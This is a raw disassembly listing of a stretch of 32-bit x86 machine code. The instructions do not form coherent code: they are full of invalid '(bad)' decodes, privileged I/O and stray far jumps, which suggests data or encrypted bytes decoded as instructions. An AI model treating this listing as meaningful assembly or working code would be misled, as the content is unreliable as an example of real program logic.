  403ec6:	sub    DWORD PTR [ecx-0x6],0x3d
  403eca:	and    al,0x26
  403ecc:	cmp    esi,esi
  403ece:	js     0x403f1e
  403ed0:	inc    ebx
  403ed1:	sbb    cl,al
  403ed3:	rol    DWORD PTR [ebx],0xf1
  403ed6:	lds    esi,FWORD PTR [esi-0x14]
  403ed9:	fistp  WORD PTR [ebx-0x37]
  403edc:	call   0x17c5df15
  403ee1:	pop    esp
  403ee2:	pop    ecx
  403ee3:	out    dx,al
  403ee4:	push   0xffffffad
  403ee6:	ins    BYTE PTR es:[edi],dx
  403ee7:	test   BYTE PTR [ebp-0x3a844774],0xd0
  403eee:	lahf   
  403eef:	pushf  
  403ef0:	in     eax,0x43
  403ef2:	leave  
  403ef3:	pop    esp
  403ef4:	sub    DWORD PTR [edi+0x67588dff],0xffffff9b
  403efb:	ja     0x403e85
  403efd:	sbb    bh,al
  403eff:	neg    BYTE PTR [edx]
  403f01:	add    edx,ebp
  403f03:	adc    edx,DWORD PTR [edx+0x4dd77eb3]
  403f09:	pop    edi
  403f0a:	aas    
  403f0b:	aam    0xed
  403f0d:	neg    BYTE PTR [edx+eiz*4]
  403f10:	pop    eax
  403f11:	sbb    DWORD PTR [esi-0x2f39234c],0x27
  403f18:	sub    eax,0xba13ef08
  403f1d:	mov    esi,0x8b54cab9
  403f22:	xchg   esp,eax
  403f23:	les    ebx,FWORD PTR [eax+edx*2+0x2f]
  403f27:	iret   
  403f28:	or     eax,0x9b6a6dbf
  403f2d:	cmp    al,0xda
  403f2f:	fstp   QWORD PTR [edx-0x12]
  403f32:	xor    eax,0xa3df2ba9
  403f37:	in     al,dx
  403f38:	pop    ss
  403f39:	mov    cs,WORD PTR [ebp+0x28c3490c]
  403f3f:	test   DWORD PTR [eax+0x75],ebp
  403f42:	dec    ecx
  403f43:	test   eax,0xa600511a
  403f48:	fistp  DWORD PTR [eax-0x1353c10d]
  403f4e:	repnz aaa 
  403f50:	addr16 add al,0x42
  403f53:	adc    BYTE PTR [eax-0x66],0xf6
  403f57:	mov    ch,0x4e
  403f59:	std    
  403f5a:	inc    ebx
  403f5b:	lahf   
  403f5c:	push   ebx
  403f5d:	jge    0x403f1e
  403f5f:	retf   0x5f01
  403f62:	cmc    
  403f63:	ins    DWORD PTR es:[edi],dx
  403f64:	adc    DWORD PTR [ecx],edi
  403f66:	add    eax,0xa1463ff2
  403f6b:	es jecxz 0x403fab
  403f6e:	popf   
  403f6f:	popa   
  403f70:	push   eax
  403f71:	fninit 
  403f73:	ins    BYTE PTR es:[edi],dx
  403f74:	mov    edi,0x28d7afc4
  403f79:	scas   al,BYTE PTR es:[edi]
  403f7a:	jo     0x403f89
  403f7c:	sbb    al,0xce
  403f7e:	xchg   ebp,eax
  403f7f:	sbb    BYTE PTR [edi-0x1674ccc7],0xc5
  403f86:	outs   dx,DWORD PTR ds:[esi]
  403f87:	dec    ebp
  403f88:	cwde   
  403f89:	cmp    al,0x77
  403f8b:	xor    bh,BYTE PTR [eax]
  403f8d:	add    eax,0xf19893d5
  403f92:	cmp    BYTE PTR [edi],bl
  403f94:	xor    BYTE PTR [esp+eax*1],bl
  403f97:	pop    ebx
  403f98:	(bad)  
  403f99:	sti    
  403f9a:	imul   edi,DWORD PTR [esi+ebp*2],0x37
  403f9e:	test   BYTE PTR [ecx],bh
  403fa0:	push   eax
  403fa1:	adc    BYTE PTR [edi-0xb5ac46a],dl
  403fa7:	loop   0x403f4c
  403fa9:	fwait
  403faa:	icebp  
  403fab:	ins    DWORD PTR es:[edi],dx
  403fac:	add    BYTE PTR [edi+0x7e],0x20
  403fb0:	mov    es,WORD PTR [ecx-0x485b3839]
  403fb6:	sub    edx,edi
  403fb8:	dec    esi
  403fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fbb:	jns    0x404038
  403fbd:	scas   al,BYTE PTR es:[edi]
  403fbe:	jae    0x403f70
  403fc0:	in     al,0x82
  403fc2:	(bad)  
  403fc4:	xchg   esi,eax
  403fc5:	aam    0xd0
  403fc7:	test   DWORD PTR [eax-0x53fd462d],eax
  403fcd:	and    eax,0xec14baf1
  403fd2:	push   ds
  403fd3:	fdiv   DWORD PTR [edi-0x654d5308]
  403fd9:	cmp    al,0xe0
  403fdb:	cld    
  403fdc:	inc    edx
  403fdd:	scas   al,BYTE PTR es:[edi]
  403fde:	imul   esi,DWORD PTR [esi],0x75
  403fe1:	lea    esp,[ebx]
  403fe3:	add    BYTE PTR [ecx+edi*2-0x50760d7d],dl
  403fea:	sbb    al,0x17
  403fec:	mov    esp,0xc1e1dbb2
  403ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ff2:	dec    ebp
  403ff3:	mov    esi,0xc52955ed
  403ff8:	sub    eax,DWORD PTR [esi+0x33d9a594]
  403ffe:	mov    edx,0xae039884
  404003:	into   
  404004:	sbb    al,0x10
  404006:	adc    eax,0x576565da
  40400b:	out    0x54,al
  40400d:	pushf  
  40400e:	cmp    BYTE PTR [eax-0x5a5e2105],dl
  404014:	call   0xf1244ed9
  404019:	pop    DWORD PTR [eax]
  40401b:	mov    bh,0x94
  40401d:	xchg   edi,eax
  40401e:	inc    edi
  40401f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404020:	dec    edx
  404021:	pop    ebp
  404022:	inc    ebp
  404023:	dec    edx
  404024:	jb     0x404095
  404026:	inc    edx
  404027:	fiadd  WORD PTR [edx]
  404029:	push   esp
  40402a:	fsub   st,st(4)
  40402c:	cmp    BYTE PTR [esi-0x52257064],0x8d
  404033:	(bad)  
  404034:	std    
  404035:	sti    
  404036:	je     0x40403b
  404038:	cli    
  404039:	and    BYTE PTR [edx+0x3f],bl
  40403c:	addr16 jle 0x404005
  40403f:	xor    cl,al
  404041:	add    edx,DWORD PTR [edx]
  404043:	retf   0xe39f
  404046:	inc    edx
  404047:	adc    DWORD PTR [ebx],ecx
  404049:	and    DWORD PTR [ebx-0xba6cded],ebp
  40404f:	in     eax,dx
  404050:	daa    
  404051:	rcr    ebx,0x64
  404054:	xor    BYTE PTR [edx+0xb],dl
  404057:	out    dx,eax
  404058:	sub    bh,bh
  40405a:	adc    BYTE PTR [ebx],dl
  40405c:	cwde   
  40405d:	inc    edx
  40405e:	mov    edi,esp
  404060:	cmp    al,BYTE PTR [esi]
  404062:	mov    ebx,DWORD PTR [edx+0x67dada61]
  404068:	mov    bh,0xca
  40406a:	cwde   
  40406b:	mov    al,ds:0x1521b1d3
  404070:	push   edi
  404071:	adc    DWORD PTR [edx-0x3b9e9683],ebx
  404077:	ds scas al,BYTE PTR es:[edi]
  404079:	pop    es
  40407a:	push   es
  40407b:	call   0xf46f:0xe57a10e3
  404082:	mov    bl,0x5d
  404084:	ds jne 0x4040cc
  404087:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  404089:	push   ebx
  40408a:	or     BYTE PTR [ecx],ah
  40408c:	mov    cl,0xa2
  40408e:	bound  eax,QWORD PTR [esi+ecx*8+0x76]
  404092:	jbe    0x404058
  404094:	mov    cl,0xd7
  404096:	(bad)  
  404098:	pop    es
  404099:	ss cmp bl,0xe3
  40409d:	mov    edi,ecx
  40409f:	or     al,0xfb
  4040a1:	add    DWORD PTR [edx+0x43408805],0xffffff94
  4040a8:	xor    BYTE PTR [ebp+0x78e9d92f],dh
  4040ae:	adc    BYTE PTR [ebx],dh
  4040b0:	jmp    0x2241:0x5a53d3b0
  4040b7:	aad    0x3b
  4040b9:	les    esp,FWORD PTR [ecx]
  4040bb:	mov    DWORD PTR ds:0xe535f0f4,edi
  4040c1:	fidivr DWORD PTR [ebp+0x34118962]
  4040c7:	push   edi
  4040c8:	inc    ebp
  4040c9:	xchg   ebp,eax
  4040ca:	je     0x404108
  4040cc:	mov    bh,BYTE PTR [edx-0x50]
  4040cf:	dec    ecx
  4040d0:	cwde   
  4040d1:	call   0xa6d63b05
  4040d6:	jmp    0x404105
  4040d8:	xor    cl,BYTE PTR [edi-0x25b18503]
  4040de:	jmp    0x40413a
  4040e0:	stc    
  4040e1:	mov    al,0xda
  4040e3:	or     edi,esp
  4040e5:	cld    
  4040e6:	adc    ebx,DWORD PTR [edx]
  4040e8:	and    eax,DWORD PTR [esi]
  4040ea:	leave  
  4040eb:	cmp    BYTE PTR [edi-0x13],ch
  4040ee:	mov    ch,0x90
  4040f0:	mov    ebp,0x88144161
  4040f5:	xchg   esp,eax
  4040f6:	call   0x70088fa7
  4040fb:	push   ebx
  4040fc:	push   edx
  4040fd:	test   al,0x82
  4040ff:	jne    0x40415a
  404101:	das    
  404102:	jno    0x4040c5
  404104:	pop    ebp
  404105:	pop    edx
  404106:	(bad)  [ebx]
  404108:	push   0x75
  40410a:	mov    ch,0x38
  40410c:	push   esi
  40410d:	and    DWORD PTR [ecx-0x2f],0xf159dd2d
  404114:	inc    ecx
  404115:	repnz test BYTE PTR [eax],cl
  404118:	ds cmp eax,0x5025dbc3
  40411e:	or     DWORD PTR [esi+0x79],ebx
  404121:	out    0x2c,al
  404123:	sar    DWORD PTR [edi],0xd2
  404126:	mov    ah,0x62
  404128:	push   ds
  404129:	pushf  
  40412a:	cmp    esp,DWORD PTR [eax+edi*2+0x7e2bbbf5]
  404131:	sbb    eax,0x41463208
  404136:	addr16 xchg edi,eax
  404138:	std    
  404139:	jl     0x404175
  40413b:	pushf  
  40413c:	pop    esi
  40413d:	test   DWORD PTR [ecx+0x71f6b95e],edx
  404143:	and    BYTE PTR [ecx-0x79],0xfe
  404147:	xchg   ebp,ebx
  404149:	xchg   esp,ecx
  40414b:	cmc    
  40414c:	fwait
  40414d:	inc    edx
  40414e:	mov    ebx,eax
  404150:	dec    edi
  404151:	or     DWORD PTR [eax-0x2168d275],edx
  404157:	aaa    
  404158:	xchg   ebp,eax
  404159:	cwde   
  40415a:	push   0xa
  40415c:	in     eax,dx
  40415d:	mov    fs,WORD PTR [ecx]
  40415f:	cmp    al,0x92
  404161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404162:	dec    ecx
  404163:	arpl   WORD PTR [ebp+ecx*8-0x67],di
  404167:	cmc    
  404168:	xchg   bl,cl
  40416a:	lods   eax,DWORD PTR ds:[esi]
  40416b:	sbb    al,0xc8
  40416d:	mov    ebx,0xc5dfffcf
  404172:	push   ecx
  404173:	pop    ss
  404174:	dec    eax
  404175:	mov    es,WORD PTR [esi]
  404177:	out    dx,al
  404178:	push   ds
  404179:	pop    ecx
  40417a:	stos   DWORD PTR es:[edi],eax
  40417b:	xchg   ecx,eax
  40417c:	pop    ss
  40417d:	test   BYTE PTR [ecx],ch
  40417f:	loop   0x404147
  404181:	xchg   ebp,eax
  404182:	cmp    esi,DWORD PTR [eax+esi*4-0x3]
  404186:	cs loop 0x4041a2
  404189:	clc    
  40418a:	or     esi,edi
  40418c:	push   0x12
  40418e:	mov    bl,0x61
  404190:	jle    0x4041d8
  404192:	fcomi  st,st(0)
  404194:	and    DWORD PTR [esi],esp
  404196:	push   edx
  404197:	push   cs
  404198:	push   esi
  404199:	aas    
  40419a:	cld    
  40419b:	shl    DWORD PTR [edx-0x5f876029],0x4c
  4041a2:	(bad)  
  4041a3:	repnz mov gs,WORD PTR es:[ebx+0x21]
  4041a8:	or     dl,ah
  4041aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ab:	rcr    DWORD PTR [edx+0x1c],1
  4041ae:	repz loope 0x40421e
  4041b1:	jmp    0x4041e1
  4041b3:	in     eax,dx
  4041b4:	loopne 0x4041bb
  4041b6:	retf   0x483e
  4041b9:	ins    BYTE PTR es:[edi],dx
  4041ba:	mov    DWORD PTR [eax],esp
  4041bc:	adc    DWORD PTR [esi+0x4fcb329f],esp
  4041c2:	jle    0x40421f
  4041c4:	jae    0x40422b
  4041c6:	or     eax,0x296d6c9e
  4041cb:	jbe    0x4041ed
  4041cd:	dec    ecx
  4041ce:	(bad)  
  4041cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041d0:	mov    DWORD PTR [eax+0x6e],esi
  4041d3:	pusha  
  4041d4:	pop    ebx
  4041d5:	jb     0x40416a
  4041d7:	jle    0x4041dd
  4041d9:	es xchg ebp,eax
  4041db:	jmp    0x50a2:0x76a9b042
  4041e2:	sub    bl,BYTE PTR [eax]
  4041e4:	sbb    DWORD PTR [eax+eax*2+0x77],esi
  4041e8:	call   0x3b73:0x738eebd2
  4041ef:	imul   eax,DWORD PTR [ebp+0x33696994],0xe0761195
  4041f9:	xchg   edi,eax
  4041fa:	fst    QWORD PTR [esi-0x4c]
  4041fd:	pop    edi
  4041fe:	(bad)  
  4041ff:	or     ah,BYTE PTR fs:[esp+ebp*4+0x68]
  404204:	fistp  DWORD PTR [edi]
  404206:	outs   dx,DWORD PTR ds:[esi]
  404207:	imul   ebp,DWORD PTR [edi],0x57
  40420a:	add    esi,DWORD PTR [ebx]
  40420c:	lods   al,BYTE PTR ds:[esi]
  40420d:	fadd   QWORD PTR [eax]
  40420f:	test   BYTE PTR [edi],ch
  404211:	daa    
  404212:	push   eax
  404213:	xor    edi,DWORD PTR [edx+0x18]
  404216:	out    dx,eax
  404217:	js     0x404215
  404219:	mov    al,ds:0xf3b9af0
  40421e:	ds or  eax,0x92cbc47d
  404224:	mov    bh,0x8
  404226:	arpl   bx,dx
  404228:	fst    QWORD PTR [esi]
  40422a:	cmp    DWORD PTR [ebx+edi*2-0x10],ecx
  40422e:	(bad)  
  404230:	sbb    BYTE PTR [ecx-0x3258b020],bh
  404236:	leave  
  404237:	imul   edi,DWORD PTR [eax],0xb3088b4e
  40423d:	adc    DWORD PTR [eax-0x2],ecx
  404240:	dec    edi
  404241:	push   edi
  404242:	stos   DWORD PTR es:[edi],eax
  404243:	jmp    0x270988ce
  404248:	sti    
  404249:	push   ss
  40424a:	xlat   BYTE PTR ds:[ebx]
  40424b:	lock mov ds,WORD PTR [eax+0x7131f781]
  404252:	pop    ss
  404253:	ds lock push 0x2b
  404257:	sub    eax,0x4830599f
  40425c:	sbb    eax,0x2b309c2d
  404261:	cmp    bh,cl
  404263:	and    al,0xea
  404265:	add    ah,BYTE PTR [edx]
  404267:	cmp    DWORD PTR [ecx],0x6d
  40426a:	fcomp  DWORD PTR [edi+edi*1]
  40426d:	ins    DWORD PTR es:[edi],dx
  40426e:	outs   dx,DWORD PTR ds:[esi]
  40426f:	jecxz  0x4042bc
  404271:	fwait
  404272:	lds    edi,FWORD PTR [eax+0x5938d07]
  404278:	mov    edx,0x96a558ed
  40427d:	mov    ah,0x2f
  40427f:	fidivr DWORD PTR [esi]
  404281:	les    ebx,FWORD PTR [ebp+0x2b]
  404284:	dec    edx
  404285:	(bad)  
  404286:	xor    eax,0xa402adde
  40428b:	pxor   mm2,QWORD PTR [esi+0x9]
  40428f:	push   ds
  404290:	mov    ?,eax
  404292:	xor    al,0x44
  404294:	aad    0x7f
  404296:	mov    ds:0x3fae2518,eax
  40429b:	mov    esp,0x86cc9e02
  4042a0:	int    0xc1
  4042a2:	mov    al,ds:0x5c456557
  4042a7:	scas   eax,DWORD PTR es:[edi]
  4042a8:	jne    0x40430a
  4042aa:	dec    edx
  4042ab:	mov    ds:0x2a3dd032,al
  4042b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042b2:	outs   dx,BYTE PTR ds:[esi]
  4042b3:	jno    0x404253
  4042b5:	or     eax,0xcc4049eb
  4042ba:	add    ecx,DWORD PTR ds:0x2395efaa
  4042c0:	test   al,0xf4
  4042c2:	cmp    DWORD PTR [ebp-0xa5048a8],ebx
  4042c8:	mov    bh,0x49
  4042ca:	in     al,0x11
  4042cc:	sub    eax,DWORD PTR [ecx-0x7d]
  4042cf:	pop    edi
  4042d0:	sbb    edx,DWORD PTR [edi+0x3d]
  4042d3:	adc    BYTE PTR [ebp-0x294c06df],0x1c
  4042da:	clc    
  4042db:	test   al,0xad
  4042dd:	lahf   
  4042de:	push   edx
  4042df:	dec    ecx
  4042e0:	jnp    0x4042fa
  4042e2:	sub    esp,edx
  4042e4:	pushf  
  4042e5:	mov    cl,0xa
  4042e7:	loop   0x404305
  4042e9:	rcl    DWORD PTR ds:0x3274baea,1
  4042ef:	sub    al,0x13
  4042f1:	sub    al,BYTE PTR [ebp-0x20]
  4042f4:	cmc    
  4042f5:	mov    bl,0x75
  4042f7:	and    ch,BYTE PTR [edx+0x1d]
  4042fa:	cdq    
  4042fb:	sar    DWORD PTR [ebx+0x71],1
  4042fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042ff:	xchg   ebp,eax
  404300:	jno    0x404349
  404302:	inc    ebp
  404303:	mov    WORD PTR [esi],ss
  404305:	imul   edi,DWORD PTR [eax+0x74c051e5],0x56
  40430c:	sub    dh,dh
  40430e:	jmp    0x8795efdf
  404313:	(bad)
  404317:	in     al,dx
  404318:	and    BYTE PTR [edx],bl
  40431a:	sbb    ah,ah
  40431c:	hlt    
  40431d:	aas    
  40431e:	sub    ecx,0xffffffd6
  404321:	add    ebp,DWORD PTR [esi]
  404323:	pusha  
  404324:	lahf   
  404325:	pop    edi
  404326:	std    
  404327:	aad    0x5f
  404329:	pop    edi
  40432a:	adc    cl,al
  40432c:	pop    ds
  40432d:	adc    al,0x20
  40432f:	sub    DWORD PTR [edi],0x2
  404332:	adc    BYTE PTR [ebp+0x26dfdcb4],ch
  404338:	leave  
  404339:	jae    0x4042d2
  40433b:	mov    esi,0xfad29683
  404340:	je     0x40430d
  404342:	fidivr DWORD PTR [ecx-0x2d591a34]
  404348:	ss jo  0x40432d
  40434b:	outs   dx,BYTE PTR ds:[esi]
  40434c:	dec    edx
  40434d:	adc    dl,BYTE PTR [esi+ebp*4]
  404350:	pop    es
  404351:	xor    eax,0x9fd2ca1e
  404356:	dec    edx
  404357:	mov    cl,0x4a
  404359:	ret    
  40435a:	pop    ecx
  40435b:	stc    
  40435c:	cs call 0xcb21:0x406b0031
  404364:	mov    al,0xe0
  404366:	sbb    al,dh
  404368:	sbb    edi,DWORD PTR [edi-0x45]
  40436b:	aas    
  40436c:	push   0xd46df1ac
  404371:	push   ds
  404372:	lock (bad) 
  404374:	(bad)  
  404375:	sti    
  404376:	xor    BYTE PTR [ebp+0x52a4ee46],0xc6
  40437d:	in     eax,dx
  40437e:	jno    0x4043e3
  404380:	jge    0x40436d
  404382:	cli    
  404383:	aad    0xc1
  404385:	mov    ebp,0x27081457
  40438a:	int    0x6e
  40438c:	ins    DWORD PTR es:[edi],dx
  40438d:	xor    edx,ebp
  40438f:	xchg   edx,eax
  404390:	mov    al,0x4c
  404392:	inc    ecx
  404393:	(bad)  
  404394:	outs   dx,BYTE PTR ds:[esi]
  404395:	mov    edi,0x9a49ad66
  40439a:	and    al,0xec
  40439c:	xor    BYTE PTR [ecx+0x236d040b],bh
  4043a2:	sub    eax,0x419eea2c
  4043a7:	out    dx,al
  4043a8:	iret   
  4043a9:	lock jo 0x404418
  4043ac:	push   cs
  4043ad:	pop    ebx
  4043ae:	(bad)  
  4043b0:	or     al,0x14
  4043b2:	jl     0x404410
  4043b4:	and    ch,BYTE PTR [ecx+0x32e4c46e]
  4043ba:	sbb    DWORD PTR [edi+0x3e],0x74f82dc8
  4043c1:	sub    edx,DWORD PTR [ebx]
  4043c3:	stc    
  4043c4:	mov    al,0xec
  4043c6:	mov    ecx,DWORD PTR [ebx-0x3e]
  4043c9:	stc    
  4043ca:	mov    esi,0x4b537749
  4043cf:	pop    esi
  4043d0:	push   sp
  4043d2:	fcom   DWORD PTR [esi]
  4043d4:	jb     0x404401
  4043d6:	jnp    0x404395
  4043d8:	inc    eax
  4043d9:	xchg   esp,edi
  4043db:	xchg   ebp,eax
  4043dc:	(bad)  
  4043dd:	out    dx,eax
  4043de:	fs jne 0x4043d8
  4043e1:	push   esp
  4043e2:	lea    ebx,fs:[ecx-0x60]
  4043e6:	lods   al,BYTE PTR ds:[esi]
  4043e7:	or     dx,WORD PTR [esi]
  4043ea:	imul   esi
  4043ec:	dec    esp
  4043ed:	mov    dh,0xd3
  4043ef:	jp     0x404408
  4043f1:	mov    DWORD PTR [ebx],edx
  4043f3:	loope  0x40443a
  4043f5:	push   edx
  4043f6:	xor    BYTE PTR [esp+edx*2-0x78081025],dh
  4043fd:	(bad)  
  4043fe:	or     eax,0x4e2d509b
  404403:	retf   
  404404:	or     eax,0xd956b902
  404409:	ja     0x4043f1
  40440b:	fisttp QWORD PTR [edx+0x63dfb02c]
  404411:	and    eax,0xb11a84c6
  404416:	push   0x34
  404418:	or     ebp,edx
  40441a:	lods   eax,DWORD PTR ds:[esi]
  40441b:	cmp    BYTE PTR [edi-0x73],ch
  40441e:	je     0x404472
  404420:	cdq    
  404421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404422:	sar    esp,cl
  404424:	jle    0x4043f0
  404426:	mov    al,0x47
  404428:	das    
  404429:	xor    al,0x96
  40442b:	push   esp
  40442c:	adc    BYTE PTR [esi],bh
  40442e:	sub    cl,bh
  404430:	sbb    esi,DWORD PTR ds:0xdfe5b39e
  404436:	xor    BYTE PTR [edx-0x2818cf58],al
  40443c:	es mov eax,0x5667c5c7
  404443:	mov    ds:0x2962d45c,eax
  404448:	iret   
  404449:	out    dx,eax
  40444a:	retf   
  40444b:	(bad)  
  40444d:	ficom  WORD PTR [eax]
  40444f:	jecxz  0x4043e1
  404451:	ins    DWORD PTR es:[edi],dx
  404452:	push   edi
  404453:	add    ch,ch
  404455:	test   al,0x59
  404457:	jae    0x404453
  404459:	shr    BYTE PTR [ecx+eax*1-0x71],0x19
  40445e:	xchg   ebx,eax
  40445f:	ins    DWORD PTR es:[edi],dx
  404460:	mov    edx,DWORD PTR [ebx-0x8]
  404463:	pop    edx
  404464:	jmp    0x40444d
  404466:	fnsave [ebp+0x4d]
  404469:	sbb    ecx,DWORD PTR ds:0x9d10397c
  40446f:	ja     0x404440
  404471:	and    DWORD PTR [edi],edi
  404473:	cmp    ch,BYTE PTR [edi+0x24]
  404476:	pop    edi
  404477:	jle    0x40448a
  404479:	mov    cl,0xdc
  40447b:	jbe    0x40441a
  40447d:	inc    DWORD PTR [esi]
  40447f:	inc    edx
  404480:	add    DWORD PTR [esi+0x25],ebp
  404483:	sbb    dl,BYTE PTR [ebp+0x2ef5a208]
  404489:	dec    ecx
  40448a:	(bad)  
  40448b:	mov    eax,ds:0xce21748f
  404490:	inc    esi
  404491:	pop    ds
  404492:	add    bl,BYTE PTR [edi-0x5ebc87ec]
  404498:	inc    esi
  404499:	std    
  40449a:	(bad)  [ebp+0x7a3f71cc]
  4044a0:	pushf  
  4044a1:	(bad)  
  4044a2:	pop    ecx
  4044a3:	sub    esi,DWORD PTR ds:0xd95f9636
  4044a9:	out    0x3,al
  4044ab:	inc    edx
  4044ac:	sti    
  4044ad:	mov    eax,0x69c5b6c5
  4044b2:	pop    ebp
  4044b3:	jmp    0xbde5474b
  4044b8:	dec    edx
  4044b9:	arpl   WORD PTR [ebp-0x3f],cx
  4044bc:	ret    
  4044bd:	shl    DWORD PTR [esi-0x19],0x2e
  4044c1:	daa    
  4044c2:	mov    edx,0x2d6bf2ed
  4044c7:	psubsb mm4,QWORD PTR [esi-0x2245884c]
  4044ce:	ret    0xf714
  4044d1:	(bad)  
  4044d2:	imul   ebx,edx,0xffffffb6
  4044d5:	test   al,0x69
  4044d7:	imul   ecx,DWORD PTR [ecx+0x7886ca0c],0x3c
  4044de:	pop    ebp
  4044df:	mov    al,ds:0x4709652
  4044e4:	ror    BYTE PTR [ebx],1
  4044e6:	mov    eax,0x4164a776
  4044eb:	push   esi
  4044ec:	shl    BYTE PTR [ecx+0x699dd382],1
  4044f2:	fcomp  QWORD PTR [esi-0x72404281]
  4044f8:	add    eax,0x249f6f35
  4044fd:	adc    DWORD PTR ds:0x184f51d4,edx
  404503:	push   eax
  404504:	hlt    
  404505:	xchg   edi,eax
  404506:	test   BYTE PTR [edx+0xf52d04d],dh
  40450c:	push   esp
  40450d:	mov    ebx,0xe064ea3d
  404512:	hlt    
  404513:	fst    DWORD PTR [esi+0x2f106285]
  404519:	jne    0x404566
  40451b:	test   DWORD PTR [edi-0x73],0xefb4878f
  404522:	inc    ebp
  404523:	test   al,0xa0
  404525:	js     0x4044f4
  404527:	cmp    DWORD PTR ds:0x6b79182f,ecx
  40452d:	xchg   edi,eax
  40452e:	sbb    al,0x55
  404531:	loope  0x40452f
  404533:	js     0x4045a3
  404535:	popf   
  404536:	adc    eax,0x1e79c09e
  40453b:	sar    esp,cl
  40453d:	shl    BYTE PTR [ebp+0x51],1
  404540:	das    
  404541:	psrlq  mm7,mm7
  404544:	pop    eax
  404545:	sub    BYTE PTR [ecx-0x66f1b836],dl
  40454b:	mov    al,0xd4
  40454d:	jne    0x40455d
  40454f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404550:	xchg   edx,eax
  404551:	aas    
  404552:	loope  0x4045bd
  404554:	inc    BYTE PTR [ecx-0x3c1bdc6c]
  40455a:	push   cs
  40455b:	rol    bh,0x3f
  40455e:	cmp    BYTE PTR [ebp+0x32b7530],0xa0
  404565:	xchg   BYTE PTR [edi],cl
  404567:	loope  0x4045aa
  404569:	loope  0x40455f
  40456b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40456c:	les    edi,FWORD PTR [ebp-0x64a25d9e]
  404572:	ret    
  404573:	mov    ah,0x3f
  404575:	mov    ecx,0xeed6217c
  40457a:	es push ecx
  40457c:	sbb    ah,BYTE PTR [eax-0x21]
  40457f:	outs   dx,DWORD PTR ds:[esi]
  404580:	inc    edi
  404581:	xor    al,BYTE PTR [eax]
  404583:	in     al,0xdd
  404585:	cmc    
  404586:	jge    0x40457d
  404588:	xchg   esi,eax
  404589:	outs   dx,BYTE PTR ds:[esi]
  40458a:	in     al,dx
  40458b:	mov    eax,ds:0x124424a7
  404590:	test   BYTE PTR [esi+0x63],bh
  404593:	mov    edx,0xa776191f
  404598:	cld    
  404599:	sub    eax,0x4871be4a
  40459e:	mov    ch,0xac
  4045a0:	lock xor dl,al
  4045a3:	scas   al,BYTE PTR es:[edi]
  4045a4:	inc    edx
  4045a5:	xchg   ebx,eax
  4045a6:	hlt    
  4045a7:	icebp  
  4045a8:	add    edx,edx
  4045aa:	jbe    0x404596
  4045ac:	out    0x7b,eax
  4045ae:	scas   eax,DWORD PTR es:[edi]
  4045af:	repnz mov BYTE PTR [edx+0x3b],ah
  4045b3:	dec    ebp
  4045b4:	dec    ebx
  4045b5:	dec    esi
  4045b6:	cmp    DWORD PTR [eax+0x60],edx
  4045b9:	jmp    0xcb4:0xb0e8253b
  4045c0:	std    
  4045c1:	cmp    esi,DWORD PTR [esi]
  4045c3:	int    0x2
  4045c5:	mov    esp,0x11e027a
  4045ca:	gs je  0x404612
  4045cd:	mov    al,0x78
  4045cf:	data16 ficom WORD PTR [edx]
  4045d2:	repnz xor eax,0x7fb48a24
  4045d9:	shl    BYTE PTR [edx],1
  4045db:	xchg   esi,eax
  4045dc:	xor    BYTE PTR [esi+ecx*2],bh
  4045df:	daa    
  4045e0:	jbe    0x4045bf
  4045e2:	lahf   
  4045e3:	mov    dl,0xf8
  4045e5:	stos   BYTE PTR es:[edi],al
  4045e6:	inc    ebp
  4045e7:	test   ah,0x7c
  4045ea:	gs icebp 
  4045ec:	inc    edi
  4045ed:	sub    eax,eax
  4045ef:	mov    dl,0x97
  4045f1:	lods   eax,DWORD PTR ds:[esi]
  4045f2:	xchg   ebx,eax
  4045f3:	stos   BYTE PTR es:[edi],al
  4045f4:	(bad)  
  4045f5:	pop    ebx
  4045f6:	inc    edi
  4045f7:	gs (bad) 
  4045fa:	call   0x79f860cc
  4045ff:	xor    eax,0x7e7f9b0c
  404604:	loope  0x40467f
  404606:	(bad)  
  404607:	mov    cl,0x9a
  404609:	jecxz  0x404660
  40460b:	outs   dx,DWORD PTR ds:[esi]
  40460c:	jo     0x40461e
  40460e:	stos   BYTE PTR es:[edi],al
  40460f:	jg     0x40467c
  404611:	adc    al,0x9b
  404613:	int3   
  404614:	pop    ebp
  404615:	jecxz  0x4045ca
  404617:	jp     0x40465c
  404619:	mov    dh,0x74
  40461b:	lea    eax,fs:[eax-0x58829f54]
  404622:	lea    eax,[edx-0x55]
  404625:	jl     0x4045cb
  404627:	push   0xf35beab7
  40462c:	(bad)  
  40462d:	mov    ds:0x92ebe28b,al
  404633:	jp     0x4045c8
  404635:	sbb    al,BYTE PTR [ebp+0x55]
  404638:	shl    BYTE PTR [eax+0x1e],0xf1
  40463c:	cmp    esp,DWORD PTR [eax]
  40463e:	cdq    
  40463f:	push   edi
  404640:	push   ebp
  404641:	and    BYTE PTR [ecx],0xa0
  404644:	ret    0xa672
  404647:	xor    dl,dh
  404649:	fsub   st,st(2)
  40464b:	dec    edx
  40464c:	mov    ah,BYTE PTR [ecx+0x11652404]
  404652:	jns    0x404671
  404654:	icebp  
  404655:	mov    ds:0x507f0db6,eax
  40465a:	push   0xffffffe8
  40465c:	scas   al,BYTE PTR es:[edi]
  40465d:	pop    eax
  40465e:	es and edi,edi
  404661:	mov    BYTE PTR [edx],al
  404663:	stos   DWORD PTR es:[edi],eax
  404664:	sbb    edx,0x18
  404667:	inc    eax
  404668:	dec    eax
  404669:	adc    edx,DWORD PTR ds:0x9a3d97a
  40466f:	jbe    0x4046a7
  404671:	test   DWORD PTR [edi-0x18],edi
  404674:	(bad)  
  404675:	aad    0xc9
  404677:	cdq    
  404678:	pushf  
  404679:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
